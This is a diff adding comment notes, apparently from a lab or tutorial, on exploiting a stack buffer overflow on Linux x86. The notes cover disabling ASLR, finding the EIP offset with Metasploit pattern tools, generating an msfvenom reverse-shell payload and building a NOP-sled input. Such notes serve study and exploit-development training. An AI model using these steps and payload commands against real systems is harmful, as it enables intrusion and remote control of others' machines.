@@ -1,3 +1,49 @@
+# Disable ASLR
+# $ sudo su
+# # echo 0 > /proc/sys/kernel/randomize_va_space
+# # cat /proc/sys/kernel/randomize_va_space
+#
+# Change GDB syntax to Intel
+# gdb -M intel
+# set disassembly-flavor intel
+# $ echo 'set disassembly-flavor intel' > ~/.gdbinit
+#
+# Steps to exploit Stack-Based Buffer Overflow
+#
+# Step 1
+# Determine the size of buffer and try to overfill it
+# run $(python -c "print '\x55' * 1200")
+# 1200 - size of a buffer + extra bytes for overwriting stack for sure
+# After getting "Program received signal SIGSEGV, Segmentation fault." check registers and ensure that EIP is overritten by a pattern \x55
+# info registers
+#
+# Step 2
+# Calculate a real offset
+# Create a patterm of desired length
+# $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
+# Use the pattern instead of \x55
+# After crashing get a value from eip
+# info registers eip
+# eip            0x69423569   0x69423569
+# and calculate the offset
+# $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
+# 
+# Now we know how many data we should provide to the application before overriding EIP
+# 
+# Step 3
+# Generating a shellcode payload
+# $ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c --bad_chars "\x00\x09\x0a\x20" --out shellcode
+# ... Payload size: 95 bytes
+# BAD CHARACTERS - those chars are not allowed and need to be excluded during payload generation
+#
+# Step 4
+# Verify that payload provided correctly
+# set a breakpoint before a vulnerable function (break FUNC_NAME)
+# run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+# Inspect memomy near to the vulnerable buffer
+# x/2000xb $esp+550
+# Check that after Us and NOPs there are exact your exploit's bytes "\xda\xca\xba\xe4..."
+# 
 # Stack Size
 # info proc mapping
 #
